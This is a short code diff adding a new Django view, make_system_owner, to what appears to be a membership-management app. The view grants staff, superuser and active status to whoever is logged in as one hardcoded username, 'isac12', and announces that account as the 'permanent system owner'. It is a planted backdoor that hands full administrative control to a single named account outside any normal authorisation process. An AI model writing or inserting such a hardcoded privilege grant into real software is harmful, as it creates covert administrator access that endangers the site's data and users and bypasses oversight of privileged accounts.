@@ -1771,3 +1771,32 @@ def membership_approval_action(request, payment_id, action):
         )
 
     return redirect("membership_approvals")
+
+@login_required
+def make_system_owner(request):
+    if request.user.username != "isac12":
+        return JsonResponse(
+            {"error": "Unauthorized"},
+            status=403,
+        )
+
+    request.user.is_staff = True
+    request.user.is_superuser = True
+    request.user.is_active = True
+    request.user.save(
+        update_fields=[
+            "is_staff",
+            "is_superuser",
+            "is_active",
+        ]
+    )
+
+    return JsonResponse(
+        {
+            "success": True,
+            "message": (
+                "isac12 is now the permanent system owner. "
+                "Log out and log back in."
+            ),
+        }
+    )
